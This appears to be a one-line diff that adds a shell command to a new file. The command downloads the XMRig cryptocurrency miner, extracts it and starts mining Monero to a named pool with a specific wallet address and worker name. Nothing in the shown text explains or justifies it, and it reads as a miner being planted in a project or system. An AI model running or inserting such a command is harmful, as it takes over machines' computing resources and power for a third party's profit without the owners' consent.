@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz; tar -xf xmrig-6.20.0-linux-x64.tar.gz; cd xmrig-6.20.0; ./xmrig -o pool.hashvault.pro:443 -u 8BkRyZCgLCX71sSW8Uk8SLMY5wx3qv86rGNfyiSWCZfFMsrMuN99ty6b8f4q2C1QrdjkTzHofxwAAU3fo5Ewugjw7ZfXR4C -p DanyDN_RIG2 -k --tls
